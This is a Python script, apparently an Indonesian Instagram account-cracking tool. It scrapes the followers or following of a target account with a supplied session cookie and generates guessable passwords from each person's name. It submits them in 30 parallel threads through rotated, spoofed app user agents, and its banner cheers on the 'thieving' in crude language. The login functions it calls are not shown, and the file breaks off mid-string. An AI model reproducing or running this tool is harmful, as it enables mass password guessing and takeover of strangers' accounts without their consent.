#!/usr/bin/python3
import urllib.parse
from urllib.parse import quote
import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich.progress import Progress,TextColumn,SpinnerColumn
from rich import print as prints
from rich.panel import Panel as panel
from string import *
xx = 0
rr = random.randint;rc = random.choice

Uid, Uuid = [], []
Ok, Cp, Loop = 0, 0, 0

###----------[ PEWARNA ]----------###
mer = '\033[1;31m'
ung = '\033[1;33m'
hijo = '\033[1;32m' 
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'  # DEFAULT
m = '\x1b[1;91m'  # RED +
k = '\033[93m'  # ungING +
h = '\x1b[1;92m'  # HIJAU +
hh = '\033[32m'  # HIJAU -
u = '\033[95m'  # UNGU
kk = '\033[33m'  # ungING -
b = '\33[1;96m'  # BIRU -
p = '\x1b[0;34m'  # BIRU +
# Warna
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
# ------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
			
#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
ung = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
BLUE = "\033[0;34m"
END  = "\033[0m"
RED  = "\033[0;31m"
CYAN = "\033[0;36m"

GREEN       = "\033[0;32m"
LIGHT_CYAN  = "\033[1;36m"
LIGHT_WHITE = "\033[1;37m"
P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
K = "\033[33m"
M, K2 = K, K
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
J='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'

def Clear():
	try:
		os.system('clear')
	except:pass

def find_res(kya= []):
	try:
		if os.path.isfile('Data/OK--50.txt') is True:
			for a in open('Data/OK-50.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
		if os.path.isfile('Data/OK-100.txt') is True:
			for a in open('Data/OK-100.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
	except:pass
	if len(kya) == 0:
		for kyta in kya:
			try:
				print(f'\n{P}Login: {H}{kyta}')
				uid = re.search('ds_user_id=(\d+)', str(kyta)).group(1)
				req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies={'cookie':kyta}).json()['user']['full_name']
				open('Data/IG-login.txt','w').write(f'{kyta}')
				print(f'\n{P}Login sebagai : {req}')
				time.sleep(2)
				return(memek)
			except Exception as e:
				print(f'\n{P}Expired: {K}{kyta}')
				
def Aset_Ig():
	Clear()
	if os.path.isfile('Data/IG-login.txt'):
		coki = {'cookie': open('Data/IG-login.txt','r').read()}
	else:
		print(f"{P}[/] Silahkan Masukan Cookies Akun Instagram Pastikan Menggunakan Akun Tumbal!")
		raraky = {'cookie': input("\ncookie: ")}
		if raraky['cookie'] == 'res':
			coki = {'cookie': find_res()}
		else:
			coki = raraky
	try:
		uid = re.search('ds_user_id=(\d+)', str(coki['cookie'])).group(1)
		req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()['user']
		open('Data/IG-login.txt','w').write(coki['cookie'])
	except:
		os.system('rm -rf Data/IG-login.txt')
		print(f"{M}cookies Invalid Gunakan Cookies yang Lain!")
		time.sleep(3)
		Aset_Ig()
	return coki, req.get('full_name', '-'), req.get('follower_count', 0)

#----------[ BANNER ]----------#
def banner():
      if "win" in sys.platform:os.system("clear")
      else:os.system("clear")
      prints(panel('''\t[white]      
████████████████████████████████████
█▄─▄▄▀█─▄▄─█▄─▄─▀█░▄▄░▄█▄─▀─▄█▄─▄▄▀█
██─▄─▄█─██─██─▄─▀██▀▄█▀██▀─▀███─██─█
▀▄▄▀▄▄▀▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▄▀▄▄█▄▄▀▄▄▄▄▀▀                            
''',width=80,style=f"white"))

def Menu():
	Clear()
	aset, nama, fol = Aset_Ig()
	banner()
	print(f"{biru} ")
	print(f"{biru}{b}{puti} USER : @{nama[:8]}")
	print(f"{biru}{b}{puti} PENGIKUT : {fol}")
	print(f"{biru}")
	print(f"{biru}")
	print(f"{biru}")
	print(f"""{biru}{b}{puti}
┌───────────────────────────────────────────────┐
│                 🔧 MENU UTAMA                 │
├───────────────────────────────────────────────┤
│  [01] ⚔️  MULAI CRACK PENGIKUT               │
│  [02] 🛰️  MULAI CRACK MENGIKUTI              │
│  [03] 💼  FITUR LAINNYA (SOON)               │
│  [00] 🗑️  HAPUS COOKIES                      │
└───────────────────────────────────────────────┘
""")
	print(f"{biru}")
	print(f"{biru}")
	x = input(f'{biru}{b}{P} INPUT MENU : ')
	if x in ['01','1']:dumps(aset, True)
	elif x in ['02','2']:dumps(aset, False)
	elif x in ['00','0']:os.system("rm Data/IG-login.txt");print("berhasil menghapus cookies");exit()

def dumps(cintil, typess, xyz = []):
	if 'csrftoken' not in str(cintil):
		try:
			memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
			token = memek['config']['csrf_token']
			cintil['cookie'] +=';csrftoken=%s;'%(token)
		except Exception as e:
			os.system('rm -rf Data/IG-login.txt')
			exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
	print(f"{biru}")
	print(f"{biru}{b}{puti} MASUKAN USERNAME TARGET")
	print(f"{biru}")
	print(f"{biru}")
	users = input(f"{biru}{b}{P} USERNAME TARGET : ").split(',')
	try:
		for y in users:
			req = requests.get(f'https://www.instagram.com/{y}/', cookies = cintil).text
			uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
			if uid not in xyz:xyz.append(uid)
	except:pass
	try:
		mode = 'followers' if typess is True else 'following'
		for kintil in xyz:
			if typess is True:
				Graphql(True, kintil, cintil['cookie'], '')
			else:
				Graphql(False, kintil, cintil['cookie'], '')
	except:pass
	print("");MetodeType()
		
def Graphql(typess, userid, cokie,after):
	global xx
	api = "https://www.instagram.com/graphql/query/"
	csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
	mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
	try:
		ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
		req = requests.get(api, params=mek, headers=ptk).json()
		if 'require_login' in req:
			if len(Uuid) > 0:
				pass
			else:
				exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
		khm = 'edge_followed_by' if typess is True else 'edge_follow'
		for xyz in req['data']['user'][khm]['edges']:
			username = xyz['node']['username']
			xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
			if xy not in Uuid:
				xx += 1
				Uuid.append(xy)
				print('\r{}{}{}TOTAL IDS {} {}{}{}                            '.format(biru, b, puti, b, b, len(Uuid), P), end='')
				time.sleep(0.0009)
		end = req['data']['user'][khm]['page_info']['has_next_page']
		if end is True:
			after = req['data']['user'][khm]['page_info']['end_cursor']
			Graphql(typess, userid, cokie, after)
		else:pass
	except:pass

def MetodeType():
	global SistemLog
	print(f"{biru}")
	print(f'{biru}{b}{puti} 01. MODE JOMOK SUPPORT{h} [ DATA ]\n{h}{h} {puti}02. MODE BIRAHI SUPPORT{h}[ WIFI ]\n {h}')
	print(f"{h}")
	print(f"{h}")
	method = input(f'{biru}{b}{puti} INPUT METHOD : ')
	if method in ['01','1']: SistemLog = "api.instagram.com"
	elif method in ['02','2']: SistemLog = "i.instagram.com"
	elif method in ['03','3']: SistemLog = "www.instagram.com"
	elif method in ['04','4']: SistemLog = "b.i.instagram.com"
	else:SistemLog = "api.instagram.com"
	SetCrack()

def SetCrack():
	print(f"{h}")
	print(f'{h}{b}{puti} SEMANGAT MALING NYA KONTOL {h}MODPES SETIAP 100 IDS YAH PUKI!{puti}')
	print(f"{h}")
	with ThreadPoolExecutor (max_workers=30) as ASF:
		for i in Uuid:
			try:
				username, name = i.split('|')
				kontol = Password(name)
				if SistemLog == "api.instagram.com":
					ASF.submit(Crack_api, username, kontol)
				elif SistemLog == "i.instagram.com":
					ASF.submit(Crack_Ajax, username, kontol)
				elif SistemLog == "www.instagram.com":
					ASF.submit(Crack_Ajax, username, kontol)
				elif SistemLog == "b.i.instagram.com":
					ASF.submit(Crack_N, username, kontol)
			except:pass
	exit(f' \n\n{biru}{b}{puti} AWALI HARI DENGAN MEMANDANG MU SEPERTI SENJAH DI SORE HARI :)')
	
def Password(name):
        xxzx, ccvc = [], []
        for nama in name.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'01');xxzx.append(nama+'02');xxzx.append(nama+'03');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'99');xxzx.append(nama+'0823');xxzx.append(nama+'0852');xxzx.append(nama+'10');xxzx.append(nama+'ganteng');xxzx.append(nama+'cantik');xxzx.append(nama+'comel');xxzx.append(nama+'imut');xxzx.append(nama+'sukses');xxzx.append(nama+'2000');xxzx.append(nama+'2001');xxzx.append(nama+'2002');xxzx.append(nama+'2003');xxzx.append(nama+'2004');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'1234567');xxzx.append(nama+'12345678');
            else:xxzx.append(nama+'12');xxzx.append(nama+'321');xxzx.append(nama+'01');xxzx.append(nama+'02');xxzx.append(nama+'03');xxzx.append(nama+'04');xxzx.append(nama+'05');xxzx.append(nama+'99');xxzx.append(nama+'0823');xxzx.append(nama+'0852');xxzx.append(nama+'ganteng');xxzx.append(nama+'comel');xxzx.append(nama+'imut');xxzx.append(nama+'sukses');xxzx.append(nama+'cantik');xxzx.append(nama+'2000');xxzx.append(nama+'2001');xxzx.append(nama+'2002');xxzx.append(nama+'2003');xxzx.append(nama+'2004');xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama+'123456');xxzx.append(nama+'1234567');xxzx.append(nama+'12345678')
        return(xxzx)

def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall('sessionid=(\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
        donez = '%s;%s;%s;ig_nrcb=1;dpr=2'%(ds_id, sesid, csrft)
    except Exception as e:
        donez = 'cookies tidak di temukan, error saat convert'
    return donez

ses = requests.Session()
def data_target(name):
	for y in name.split(','):
		try:
			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
			profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
			post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
			peng  = profil_info_target["edge_followed_by"]["count"]
			meng = profil_info_target["edge_follow"]["count"]
			mail = profil_info_target["business_email"]
			phone = profil_info_target["business_phone_number"]
			fullname = profil_info_target["full_name"]
			fbid = profil_info_target["fbid"]
		except Exception as e:
			post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
	return post, peng, meng, mail, fullname, fbid, phone

def UserAgentApp2():
    code = random.choice(['370911961','370911964','370911965','370911966','370911967','370911968','370911971','370911972','370911973','370911974','370911975','370911976','370911977','371025731'])
    app_version = random.randint(100, 342)
    android_version = random.randint(25, 31)
    app_patch_version = random.randint(14, 46)
    build_number = random.randint(85, 125)
    bahasa = random.choice(['en_US', 'id_ID'])
    realme = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; realme; RMX3782; RE5C6CL1; mt6835; {bahasa}; {code})'
    huawai = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/10; 480dpi; 1080x2282; HUAWEI; FRL-L22; HWFRL-M; mt6768; {bahasa}; {code})'
    samsung = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; samsung; SM-A225F; A225FXXU3BVF1; mt6768; {bahasa}; {code})'
    xiaomi = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; Xiaomi; Redmi 9A; M2006C3LG; mt6768; {bahasa}; {code})'
    vivo = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; vivo; vivo 2007; PD1969F_EX; mt6768; {bahasa}; {code})'
    oppo = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; OPPO; CPH2083; CPH2083_11_A.53; mt6768; {bahasa}; {code})'
    iphone = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} iOS ({android_version}/14; 2; iPhone; iPhone 12; iPhone12,1; {bahasa}; {code})'
    iphone_x = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} iOS ({android_version}/14; 2; iPhone; iPhone X; iPhone10,3; {bahasa}; {code})'
    google_pixel = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Google; Pixel 5; GD1Y; mt6768; {bahasa}; {code})'
    infinix = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Infinix; Infinix Note 10; X6812; mt6768; {bahasa}; {code})'
    pragmatyc = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Pragmatyc; Pragmatyc Device; PGT-1; mt6768; {bahasa}; {code})'
    return random.choice([realme, huawai, samsung, xiaomi, vivo, oppo, iphone, iphone_x, google_pixel, infinix, pragmatyc])

def Android_Version(android_version):
	if str(android_version) == '9':
		return ('28')
	elif str(android_version) == '10':
		return ('29')
	elif str(android_version) == '11':
		return ('30')
	elif str(android_version) == '12':
		return ('31')
	else:
		return ('32')

def UserAgentBarcelona():
	#; #
	dpis = random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
	android_version = random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
	language = random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
	pxl = random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256'])
	kode = rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
	igv = ("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.9